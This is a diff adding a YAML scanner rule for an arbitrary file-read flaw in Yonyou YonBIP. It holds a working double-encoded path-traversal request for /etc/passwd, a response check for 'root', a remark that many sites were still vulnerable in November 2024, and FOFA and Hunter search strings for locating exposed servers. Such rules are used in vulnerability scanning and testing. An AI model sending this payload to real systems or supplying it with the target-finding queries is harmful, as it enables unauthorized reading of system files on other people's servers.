@@ -1,0 +1,15 @@
+name: yongyou-BIP-fileread       #用友YonBIP         
+rules: 
+  - method: GET    
+    path: /iuap-apcom-workbench/ucf-wh/yonbiplogin/..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd%2500.png.js
+    headers:
+    body:                 
+    expression:                        
+      status_code:                
+      response_header:              
+      response_body: root                      
+detail:                          
+  description: "用友YonBIP yonbiplogin接口存在任意文件读取漏洞,截止到2024.11.17仍存在很多该漏洞网站"
+  search:             
+    fofa: title="数字化工作台"
+    鹰图: web.title="数字化工作台"
